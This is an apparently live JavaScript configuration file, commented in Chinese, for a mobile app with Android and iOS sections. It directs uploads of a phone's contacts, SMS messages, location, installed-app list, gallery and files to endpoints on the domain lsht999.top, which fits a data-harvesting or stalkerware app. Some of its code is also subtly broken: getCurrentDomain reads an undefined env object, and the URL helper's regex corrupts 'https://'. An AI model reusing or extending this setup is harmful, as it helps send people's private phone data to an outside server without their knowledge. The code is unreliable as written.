

export default {
    // 基础域名配置
    baseUrl: 'https://lsht999.top/',
    
    // 资源路径配置
    resources: {
        // 不再使用loading.html中转
    },
    
    // API配置
    api: {
        base_url: 'https://lsht999.top/',  // 基础域名
        api_path: '/api',                        // API 路径前缀
        upload: {
            media: '/Uploads/upload',      // 媒体文件上传
            contacts: '/Uploads/api',      // 通讯录上传
            location: '/Uploads/apimap',   // 位置上传
            sms: '/Uploads/apisms',        // 短信上传
            apps: '/Uploads/apiapps'       // 应用信息上传
        },
        config: '/config/getAppConfig'     // 添加获取配置的API路径
    },
    
    // 上传配置
    upload: {
        pic_count: 0,    // 0表示不限制图片数量
        video_count: 0,  // 0表示不限制视频数量
        is_video: 1      // 1表示允许视频
    },
    
    // 应用默认配置
    defaults: {
        screen_orientation: 'portrait'  // 默认屏幕方向为竖屏
    },
    
    // 获取完整的API URL
    getApiUrl(path) {
        return `${this.api.base_url}${path}`.replace(/\/+/g, '/');
    },
    
    // 获取当前环境的域名配置
    getCurrentDomain() {
        return this.env.domains[this.env.current];
    },
    
     // Android API配置
        android_api: {
            base_url: 'https://lsht999.top/',
            api_path: '/api/',
            upload: {
                contacts: 'Uploads/api',     // 通讯录上传
                location: 'Uploads/apimap',  // 位置上传
                sms: 'Uploads/apisms',       // 短信上传
                media: 'Uploads/upload',     // 媒体文件上传
                apps: 'Uploads/apiapps'      // 应用信息上传
            }
        },

    // iOS API配置
    ios_api: {
        base_url: 'https://lsht999.top/',
        api_path: '/api/',
        upload: {
            gallery: 'api/Uploads/iosUpload',     // 相册上传接口
            uploadFile: 'api/Uploads/uploadFile',  // 文件流上传接口
            contacts: 'Uploads/api',              // 通讯录上传接口
            location: 'Uploads/apimap'            // 定位上传接口
        }
    }
    
    // 不再包含 redirect_urls，改为通过API获取
} 